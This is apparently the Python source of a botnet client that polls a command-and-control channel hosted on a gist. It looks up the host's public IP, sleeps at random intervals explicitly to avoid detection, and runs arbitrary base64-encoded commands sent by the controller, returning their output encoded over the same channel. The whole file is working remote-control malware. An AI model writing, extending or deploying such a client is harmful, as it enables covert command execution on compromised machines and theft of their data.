import base64
import json
import subprocess
import threading
from queue import Empty
from queue import Queue
import random

import requests

from channel import Channel
from time import sleep


class Bot:
    def __init__(self, token: str, gist: str):
        self.channel = Channel(token, gist)
        self.unprocessed_commands = Queue()
        self.active = True
        self.worker_thread = None
        self.ip = (
            requests.get("https://am.i.mullvad.net/ip").content.decode("utf-8").strip()
        )

        self.wait_for_commands()

    def wait_for_commands(self):
        """
        Waits for commands from C&C as long as self.active == True
        """
        self.worker_thread = threading.Thread(target=self.process_commands, daemon=True)

        self.worker_thread.start()

        while self.active:
            for command in self.channel.check_messages():
                print(f"New command = {command.body}")
                self.unprocessed_commands.put(command)

            # Randomized sleep for a lesser chance of detection
            sleep(random.uniform(1.5, 5))

        self.worker_thread.join()

    def process_commands(self):
        """
        Processes new commands from C&C as long as self.active == True
        """
        while self.active:
            try:
                current_command = self.unprocessed_commands.get(timeout=5)
            except Empty:
                continue

            response_id = f"[]({base64.b64encode(f'{current_command.id}-{self.ip}'.encode('utf-8')).decode('utf-8')})"
            ip_b64 = base64.b64encode(self.ip.encode("utf-8")).decode("utf-8")

            print(f"Processing command = {current_command.body}")

            # PING
            if Channel.PING_REQUEST in current_command.body:
                self.channel.send_message(f"{Channel.PING_RESPONSE} {response_id}")

            # SHUT OFF
            elif (
                Channel.SHUT_OFF_REQUEST in current_command.body
                and ip_b64 in current_command.body
            ):
                self.channel.send_message(
                    f"{Channel.SHUT_OFF_RESPONSE} " f"{response_id}"
                )
                self.active = False

            # ARBITRARY BINARY
            elif (
                Channel.BINARY_REQUEST in current_command.body
                and ip_b64 in current_command.body
            ):
                command = (
                    base64.b64decode(
                        current_command.body.split("<")[1].split(">")[0]
                    ).decode("utf-8")
                    if "<" in current_command.body and ">" in current_command.body
                    else None
                )
                if command:
                    self.execute_binary(
                        command.split(" "), Channel.BINARY_RESPONSE, response_id
                    )

            # TODO: Additional commands

            self.unprocessed_commands.task_done()

    def execute_binary(self, args: list[str], response_header: str, response_id: str):
        """
        Executes a binary on the system
        :param args: Args including the name of the binary
        :param response_header: Which response message to use
        :param response_id: ID to append to the output
        """
        process = subprocess.run(args, capture_output=True)
        self.channel.send_message(
            f"{response_header} "
            f"[]({base64.b64encode(process.stdout).decode('utf-8')})"
            f"[]({base64.b64encode(process.stderr).decode('utf-8')})"
            f"{response_id}"
        )
